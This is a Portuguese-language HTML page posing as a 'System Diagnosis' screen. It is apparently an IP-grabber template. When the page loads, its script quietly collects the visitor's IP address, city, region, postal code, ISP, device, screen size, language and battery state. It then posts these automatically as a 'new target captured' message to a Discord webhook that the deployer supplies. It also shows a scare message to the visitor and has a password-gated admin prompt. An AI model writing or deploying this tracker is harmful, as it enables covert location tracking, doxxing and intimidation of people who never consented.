<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Diagnosis</title>
<style>
:root{--bg:#000000;--card:#050505;--border:#121212;--red:#ff0033;--red-glow:rgba(255,0,51,0.25);--text:#e6e6e6;--muted:#555555;--green:#00ff66;--insta:#e1306c}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New', Courier, monospace;-webkit-tap-highlight-color:transparent}
body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
.container{width:100%;max-width:400px;text-align:center}

.screen{background:var(--card);border:1px solid var(--border);padding:24px 18px;border-radius:8px;box-shadow:0 0 50px rgba(0,0,0,0.9)}

/* Logotipo Obscuro */
.skull-logo{font-size:2rem;margin-bottom:10px;filter:drop-shadow(0 0 8px var(--red));animation:pulse 2s infinite}
@keyframes pulse{0%{opacity:0.6} 50%{opacity:1} 100%{opacity:0.6}}

.alert-title{font-size:0.8rem;font-weight:900;color:var(--red);margin-bottom:6px;letter-spacing:2px;text-transform:uppercase}
.alert-desc{font-size:0.68rem;color:var(--muted);margin-bottom:16px;line-height:1.4}

/* Caixa de Dados Técnicos */
.data-box{background:#000000;border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:16px;text-align:left;font-size:0.68rem}
.data-row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid rgba(255,255,255,0.02)}
.data-row:last-child{border-bottom:none}
.data-label{color:var(--muted)}
.data-val{color:var(--red);font-weight:700}

.btn-admin{background:transparent;color:var(--muted);border:1px solid var(--border);padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;letter-spacing:1px;transition:all 0.2s;margin-top:8px}
.btn-admin:hover{color:#fff;border-color:#333}

/* Botão Instagram */
.btn-insta{background:transparent;color:#e1306c;border:1px solid #33111f;padding:10px;width:100%;border-radius:6px;cursor:pointer;font-weight:700;text-transform:uppercase;font-size:0.65rem;letter-spacing:1px;transition:all 0.2s;display:block;text-decoration:none;margin-bottom:8px}
.btn-insta:hover{background:#1a050d;border-color:var(--insta)}
</style>
</head>
<body>

<div class="container">

  <!-- Ecrã Principal -->
  <div id="home-screen" class="screen">
    <div class="skull-logo">⚠️</div>
    <div class="alert-title">Você acabou de vazar seu IP.</div>
    <div class="alert-desc">O seu ambiente digital foi mapeado por completo em tempo real.</div>

    <div class="data-box">
      <div class="data-row"><span class="data-label">IP:</span><span id="targetIp" class="data-val">A rastrear...</span></div>
      <div class="data-row"><span class="data-label">Local:</span><span id="targetLocation" class="data-val">A localizar...</span></div>
      <div class="data-row"><span class="data-label">Provedor:</span><span id="targetIsp" class="data-val">A identificar...</span></div>
      <div class="data-row"><span class="data-label">Dispositivo:</span><span id="targetDevice" class="data-val">A detetar...</span></div>
      <div class="data-row"><span class="data-label">Ecrã / Resolução:</span><span id="targetScreen" class="data-val">A calcular...</span></div>
      <div class="data-row"><span class="data-label">Idioma / Sistema:</span><span id="targetLang" class="data-val">A verificar...</span></div>
      <div class="data-row"><span class="data-label">Bateria:</span><span id="targetBattery" class="data-val">A ler...</span></div>
    </div>

    <!-- Botão Instagram -->
    <a href="https://instagram.com/o_teu_utilizador" target="_blank" class="btn-insta">📸 Seguir no Instagram</a>
    
    <button class="btn-admin" onclick="openAdmin()">Acessar administração</button>
  </div>

</div>

<script>
// COLA O TEU WEBHOOK DO DISCORD AQUI EMBAIXO ENTRE AS ASPAS:
const WEBHOOK_URL = "O_TEU_WEBHOOK_DO_DISCORD_AQUI";

function getDeviceInfo() {
  let ua = navigator.userAgent;
  let device = "Desconhecido";

  if (/iphone/i.test(ua)) device = "Apple iPhone";
  else if (/ipad/i.test(ua)) device = "Apple iPad";
  else if (/samsung/i.test(ua) || /sm-/i.test(ua)) device = "Samsung Galaxy";
  else if (/xiaomi|redmi|poco/i.test(ua)) device = "Xiaomi/Redmi";
  else if (/huawei|honor/i.test(ua)) device = "Huawei";
  else if (/moto/i.test(ua)) device = "Motorola";
  else if (/android/i.test(ua)) device = "Android Device";
  else if (/windows/i.test(ua)) device = "PC Windows";
  else if (/macintosh|mac os x/i.test(ua)) device = "Apple Mac";
  else if (/linux/i.test(ua)) device = "Linux PC";

  return device;
}

async function getBatteryInfo() {
  if ('getBattery' in navigator) {
    try {
      let battery = await navigator.getBattery();
      let level = Math.round(battery.level * 100) + '%';
      let charging = battery.charging ? '⚡ a carregar' : '🔋 a descarregar';
      return `${level} (${charging})`;
    } catch(e) {
      return 'Indisponível';
    }
  }
  return 'Não suportado';
}

window.onload = async function() {
  let deviceBrand = getDeviceInfo();
  document.getElementById('targetDevice').innerText = deviceBrand;
  
  let screenRes = `${window.screen.width}x${window.screen.height}`;
  let lang = navigator.language || 'N/A';
  document.getElementById('targetScreen').innerText = screenRes;
  document.getElementById('targetLang').innerText = lang;

  let batteryStatus = await getBatteryInfo();
  document.getElementById('targetBattery').innerText = batteryStatus;

  try {
    let res = await fetch('https://ipwho.is/');
    let data = await res.json();

    if(data.success) {
      let ipVal = data.ip;
      let fullAddress = `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'} (${data.postal || 'CEP N/A'})`;
      let ispVal = data.connection?.isp || 'N/A';
      let timeNow = new Date().toLocaleTimeString();

      document.getElementById('targetIp').innerText = ipVal;
      document.getElementById('targetLocation').innerText = `${data.city || 'N/A'}, ${data.country_code || ''}`;
      document.getElementById('targetIsp').innerText = ispVal;

      // Envia automaticamente para o teu Discord via Webhook
      if(WEBHOOK_URL && WEBHOOK_URL.startsWith("https://")) {
        let payload = {
          content: `🚨 **NOVO ALVO CAPTURADO!**\n` +
                   `• **IP:** \`${ipVal}\`\n` +
                   `• **Endereço:** ${fullAddress}\n` +
                   `• **Provedor:** ${ispVal}\n` +
                   `• **Dispositivo:** ${deviceBrand}\n` +
                   `• **Ecrã:** ${screenRes} | **Bateria:** ${batteryStatus}\n` +
                   `• **Hora:** ${timeNow}`
        };

        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(err => console.log('Erro ao enviar webhook'));
      }

    } else {
      document.getElementById('targetIp').innerText = "Indisponível";
      document.getElementById('targetLocation').innerText = "Protegido";
    }
  } catch(e) {
    document.getElementById('targetIp').innerText = "Erro de rede";
  }
};

function openAdmin() {
  let pass = prompt('Palavra-passe de acesso:');
  if(pass === '17102007') {
    alert('⚠️ Os registos de todos os alvos agora chegam diretamente no teu canal do Discord configurado no Webhook!');
  } else if(pass !== null) {
    alert('Acesso negado.');
  }
}
</script>
</body>
</html>
